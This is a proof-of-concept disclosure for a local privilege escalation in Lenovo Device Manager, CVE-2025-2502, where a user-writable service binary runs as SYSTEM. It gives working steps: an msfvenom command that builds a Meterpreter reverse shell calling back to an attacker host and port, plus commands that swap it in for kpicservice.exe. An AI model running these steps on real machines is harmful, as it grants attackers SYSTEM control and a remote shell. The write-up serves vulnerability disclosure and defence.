# CVE-2025-2502 — Lenovo Device Manager: Local Privilege Escalation (POC)
# Set target paths
set TARGET_DIR=%ProgramData%\Lenovo\devicecenter\modules\aipicture\5.1.80.8121
set PAYLOAD_PATH=%USERPROFILE%\Desktop\kpicservice.exe
set BACKUP_PATH=%TARGET_DIR%\kpicservice.exe.backup
## Vulnerability Overview

While studying local privilege escalation techniques in a Windows lab, I installed Lenovo Device Manager to inspect its installed components. Browsing the ProgramData modules out of curiosity, I noticed oddly permissive ACLs on the module directories — files downloaded by the application were writable by standard users.

That raised a red flag: if a service binary stored in such a directory runs as LocalSystem, and a non-privileged user can alter the file content, a simple replace-and-reboot could make the service execute attacker-controlled code as SYSTEM.

## Vulnerability technical Overview

A permissions flaw in Lenovo Device Manager (all versions observed) grants non-privileged users **F (Full) control** over downloaded tool binaries under `%ProgramData%\Lenovo\devicecenter\modules\…`. A privileged service (`KPICService_Lenovo`) loads one such binary as LocalSystem; because an unprivileged user can replace that binary on disk, the service will start the replaced binary as SYSTEM after a reboot — enabling local privilege escalation.

![Vulnerability Overview](https://github.com/user-attachments/assets/b93b76b1-f2f2-436f-a5dd-72f4248600af)

## Lab Setup & Reproduction

### 1. Setup Lab Environment

- Host a Windows VM and take a snapshot
- Install Lenovo Device Manager and the AI Picture plugin (vulnerable version)
- Ensure the VM is isolated from production networks

![Lab Setup](https://github.com/user-attachments/assets/9fcdeeaf-3600-4dc7-b646-6e7e8bc78c5a)

### 2. Confirm Service & Permissions

Inspect the service configuration and file permissions:

**Service Location:**

%ProgramData%\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe


![Service Configuration](https://github.com/user-attachments/assets/ef41db4c-c148-4512-ad15-a8eb82d14427)

![File Permissions](https://github.com/user-attachments/assets/e33ef6fe-910d-48cc-beab-0f4d2f841f6e)

### 3. Validate

With the system booted into a state where the service process is locked, confirm an unprivileged account can move or rename the original `kpicservice.exe` file.

<img width="803" height="148" alt="image" src="https://github.com/user-attachments/assets/96afd83f-22ce-4ed9-be10-1acef9a914ac" />

## Practical Exploitation Steps

### Generate Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=4444 -f exe -o kpicservice.exe
```
# Move original file
```bash
move "%TARGET_DIR%\kpicservice.exe" "%BACKUP_PATH%"
```
# Replace with payload
```bash
move "%PAYLOAD_PATH%" "%TARGET_DIR%\kpicservice.exe"
```
### Trigger Exploitation
Reboot the device

The service automatically starts the replaced kpicservice.exe (payload)

Obtain SYSTEM privileges

<img width="921" height="677" alt="image" src="https://github.com/user-attachments/assets/56ba6c54-af25-449a-8b2e-aec7add0a96e" />

### Disclaimer
This POC is for educational and defensive security purposes only. Always ensure you have proper authorization before testing on any systems.
